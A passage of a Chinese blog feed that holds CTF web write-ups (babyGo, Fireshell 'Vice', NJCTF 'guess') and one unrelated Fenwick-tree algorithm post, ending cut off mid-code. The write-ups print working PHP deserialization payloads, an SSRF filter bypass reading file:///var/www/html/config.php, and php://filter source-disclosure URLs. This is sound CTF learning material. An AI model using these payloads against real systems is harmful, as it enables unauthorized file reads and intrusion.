    <content type="html"><![CDATA[<h1 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file)) &#123;             </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化题。<br>注意到一个魔术方法 <code>__toString()</code>，当 <code>echo $obj;</code> 时会自动调用。<br>第三行的 <code>include &#39;flag.php&#39;;</code> 想必 flag 就在这个文件里了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br></pre></td></tr></table></figure></p><p>只要满足这个 <code>if</code> 就能读到 <code>flag.php</code></p><p>这里有两个思路，</p><ul><li>让 <code>amzing</code> 直接为空，反序列化后<code>nice</code>依然为空，<br>得到的 <code>$this-&gt;nice-&gt;aaa</code>和 <code>$this-&gt;nice-&gt;bbb</code>自然全为 null，所以 <code>===</code>。</li><li><p>让<code>this-&gt;bbb = &amp;this-&gt;aaa</code>，随便 <code>aaa</code> 怎么变。<br>此处的 <code>exp</code> 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cc = <span class="keyword">new</span> baby();</span><br><span class="line">$cc-&gt;bbb = &amp;$cc-&gt;aaa;</span><br><span class="line">print_r(urlencode(serialize($cc)));</span><br><span class="line"><span class="comment">/* O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22s</span></span><br><span class="line"><span class="comment">ec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D */</span></span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  <span class="comment">// cool 对象</span></span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;skyobj = new sec;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;skyobj-&gt;amzing = 'O%3A4%3A%22baby%22%3A3%3A.........';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bb = <span class="keyword">new</span> baby();</span><br><span class="line">print_r(urlencode(serialize($bb)));</span><br></pre></td></tr></table></figure></li></ul><p>url 编码是必要的，避免特殊符号编码引起的长度歧义，出现 <code>Error at offset 错误</code>。<br>flag 在源代码里，记得查看。</p><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h1><p>待更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;babyGo&quot;&gt;&lt;a href=&quot;#babyGo&quot; class=&quot;headerlink&quot; title=&quot;babyGo&quot;&gt;&lt;/a&gt;babyGo&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2019 fireshell web Vice</title>
    <link href="https://wywwzjj.top/2019/01/30/2019-Fireshell-Web-Vice/"/>
    <id>https://wywwzjj.top/2019/01/30/2019-Fireshell-Web-Vice/</id>
    <published>2019-01-30T05:52:46.000Z</published>
    <updated>2019-02-28T09:03:55.473Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目所给源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//require_once 'config.php';</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHITS</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $url;</span><br><span class="line"><span class="keyword">private</span> $method;</span><br><span class="line"><span class="keyword">private</span> $addr;</span><br><span class="line"><span class="keyword">private</span> $host;</span><br><span class="line"><span class="keyword">private</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method,$url)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"><span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doit</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = @parse_url(<span class="keyword">$this</span>-&gt;url)[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;addr = @gethostbyname(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = @gethostbyaddr(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;addr !== <span class="string">"127.0.0.1"</span> || <span class="keyword">$this</span>-&gt;name === <span class="keyword">false</span>)&#123;</span><br><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">$p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line"><span class="keyword">if</span>($p)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">"doit"</span>)))&#123;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">array</span>());</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"gg"</span>])) &#123;</span><br><span class="line">@unserialize($_GET[<span class="string">"gg"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开 <code>config.php</code> ，出现 awn…<br>猜想 <code>flag</code> 在 <code>config.php</code> 中，并且有访问限制，构造 <code>ssrf</code> 进行访问，然而还是啥都没有，与外网直接访问的界面一样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$not = [<span class="string">'.txt'</span>,<span class="string">'.php'</span>,<span class="string">'.xml'</span>,<span class="string">'.html'</span>,<span class="string">'.'</span>,<span class="string">'['</span>,<span class="string">']'</span>];</span><br><span class="line"><span class="keyword">foreach</span>($not <span class="keyword">as</span> $ext)&#123;</span><br><span class="line">    $p = strpos(<span class="keyword">$this</span>-&gt;url,$ext);</span><br><span class="line">    <span class="keyword">if</span>($p)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">":)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处可构造   <a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">绕过方法参考</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@68.183.31.62:991/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'.php@localhost/config.php'</span>);</span><br><span class="line">$gg = <span class="keyword">new</span> SHITS(<span class="string">'doit'</span>, <span class="string">'localhost/config%2ephp'</span>);</span><br><span class="line">$ser = serialize($gg);</span><br><span class="line"><span class="keyword">echo</span> urlencode($ser) .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($ser);</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>SHITS%<span class="number">22</span>%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>url%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22.</span>php%<span class="number">4068.183</span><span class="number">.31</span><span class="number">.62</span>%<span class="number">3</span>A991%<span class="number">2</span>Fco</span><br><span class="line">nfig.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>method%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>doit%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>addr%<span class="number">22</span>%<span class="number">3</span>B</span><br><span class="line">N%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SHITS%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></p><p>先URL编码，若序列化后直接反序列化，某些特殊符号的编码问题会引起<code>length</code>混乱，出现 <code>unserialize(): Error at offset 错误</code>，<br>也可以进行其他的编码，比如 base64，但是需要改代码，这里利用 web 特性，<code>url 编码</code>最方便</p><p>但是并没有什么卵用</p><p>还是得 <code>file:///var/www/html/config%2ephp</code> 二次编码绕过 <code>.</code></p><p><strong>exp</strong>：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O<span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%22</span>SHITS<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">5</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">10</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>url<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">33</span><span class="symbol">%3</span>A<span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fvar<span class="symbol">%2</span>Fwww</span><br><span class="line"><span class="symbol">%2</span>Fhtml<span class="symbol">%2</span>Fconfig<span class="symbol">%252</span>ephp<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>method<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">4</span><span class="symbol">%3</span>A<span class="symbol">%22</span>doit<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span></span><br><span class="line"><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>addr<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>host<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">11</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>SHITS<span class="symbol">%00</span>name<span class="symbol">%22</span><span class="symbol">%3</span>BN<span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure></p><p>读取 <code>config.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'::1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"aaawn"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$flag =<span class="string">"F#&#123;wtf_5trp0s_&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>观察代码，此处的 <code>||</code>，能到 else 吗，出题人真阴险 :)</p><p>其实可以这样，不需要所有属性，只要前两个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目所给源码&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="ssrf" scheme="https://wywwzjj.top/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>POJ 2352 Stars[树状数组]</title>
    <link href="https://wywwzjj.top/2019/01/02/%C2%96POJ-2352-Stars-%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <id>https://wywwzjj.top/2019/01/02/POJ-2352-Stars-树状数组/</id>
    <published>2019-01-02T01:52:33.000Z</published>
    <updated>2019-05-02T03:19:54.220Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://poj.org/problem?id=2352" target="_blank" rel="noopener">原题链接</a><br> <strong>题目大意</strong><br>  给出一些星星的二维坐标，求星星左方，下方，左下方的星星个数。</p><p><strong>思路</strong><br>题目已经把星星按照 y 坐标从小到大排序，若 y 相等则按 x 从小到大排序。因此，在每次对一个星星进行统计时，之前出现过的星星，只要 x 坐标比其小，则必在其左，左下方，x 坐标相等的自然在下方。</p><p><strong>代码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">4e4</span>;  <span class="comment">// 注意此处</span></span><br><span class="line"><span class="keyword">int</span> arr[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[N/<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; N) &#123;  <span class="comment">// 注意是 N</span></span><br><span class="line">        arr[i] += v;</span><br><span class="line">        i += lowbit(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x) &#123;</span><br><span class="line">        res += arr[x];</span><br><span class="line">        x -= lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y; <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        ans[Sum(++x)]++;  <span class="comment">// x 要加一</span></span><br><span class="line">        add(x, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://poj.org/problem?id=2352&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题链接&lt;/a&gt;&lt;br&gt; &lt;strong&gt;题目大意&lt;/strong&gt;&lt;br&gt;  给出一些星星的二维坐标，求星星左方，下方，左下方的
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 NJCTF web guess</title>
    <link href="https://wywwzjj.top/2018/12/30/2017-NJCTF-Guess/"/>
    <id>https://wywwzjj.top/2018/12/30/2017-NJCTF-Guess/</id>
    <published>2018-12-30T04:54:58.000Z</published>
    <updated>2019-04-09T07:33:43.141Z</updated>
    
    <content type="html"><![CDATA[<p>粗一看，是文件上传的题目。</p><p>随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。</p><p>问题是文件传到哪里去了，这也是本题的核心考点。</p><p><a href="http://111.198.29.45:30117/?page=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=upload</a></p><p>url 有所变化，可能任意跳转，尝试下伪协议读源码，成功。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">        $page=$_GET[<span class="string">'page'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $page=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 